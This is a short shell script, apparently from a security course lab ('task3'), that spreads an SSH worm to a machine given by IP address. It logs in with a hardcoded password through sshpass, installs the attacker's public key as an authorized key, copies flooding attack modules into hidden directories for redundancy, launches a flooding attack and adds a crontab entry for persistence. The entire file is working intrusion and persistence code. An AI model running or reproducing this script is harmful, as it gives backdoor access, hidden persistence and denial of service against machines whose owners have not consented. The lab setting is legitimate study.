# task3
# input victim's IP address
export SSHPASS='victim'

read -p "Enter Victim IP Address: " IP_Address
sshpass -e scp -r ../ssh_worm victim@"$IP_Address":/home/victim/Desktop/




# publickey
SSH_PATH="/home/victim/.ssh"

ssh-keygen

sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
#####

ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.qq";
			mkdir -p $Hidden1;
			cp ./Infect/Flooding_Attack $Hidden1;
			cp ./Infect/Check_Attack $Hidden1;
			cp ./Infect/Launching_Attack $Hidden1;

			Hidden2="/home/victim/.Launch_Attack";
			mkdir -p $Hidden2;
			cp ./Infect/Flooding_Attack $Hidden2;
			cp ./Infect/Check_Attack $Hidden2;
			cp ./Infect/Launching_Attack $Hidden2;

			# When one of attack modules is removed, the attack can still be launched by the other
			cd "$Hidden2" && ./Flooding_Attack;
			echo "$(cat crontab.txt)" >> /etc/crontab;'




ssh victim@"$IP_Address"